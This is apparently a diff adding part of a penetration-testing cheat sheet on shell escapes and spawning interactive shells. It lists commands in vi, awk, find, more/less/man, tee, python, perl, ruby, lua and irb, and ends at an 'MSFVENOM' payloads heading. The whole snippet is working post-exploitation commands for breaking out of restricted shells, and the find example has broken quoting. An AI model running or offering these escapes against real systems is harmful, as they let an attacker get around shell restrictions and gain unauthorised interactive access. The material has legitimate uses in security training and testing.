@@ -1,4 +1,44 @@
+== SPAWN a shell ==
    
+   python -c 'import pty; pty.spawn("/bin/bash")'
+   
+   - open vi or vim and type:
+   :set shell=/bin/bash
+   
+   Next, type and execute
+   :shell
+   
+   or
+   :! /bin/bash
+   
+  == AWK ==
+  awk 'BEGIN {system("/bin/sh")}'
+  
+  == FIND ==:
+  find / -name blahblah 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
+  
+  == MORE, less, and man Commands ==
+  - After you use the 'more', 'less', or 'man' command with a file, type '!' followed by a command. For instance, try the following once inside the file:
+   
+ '! /bin/sh'
+'!/bin/sh'
+'!bash'
+
+== tee command == 
+echo "evil script code" | tee script.sh
+// tee -a to append at the end of the file
+
+== Spawn a shell with a programming language ==
+Try invoking a SHELL through your favorite language:
+
+python: exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()
+perl -e 'exec "/bin/sh";'
+perl: exec "/bin/sh";
+ruby: exec "/bin/sh"
+lua: os.execute('/bin/sh')
+irb(main:001:0> exec "/bin/sh" 
+ 
+ 
             == MSFVENOM ==
     
  List payloads
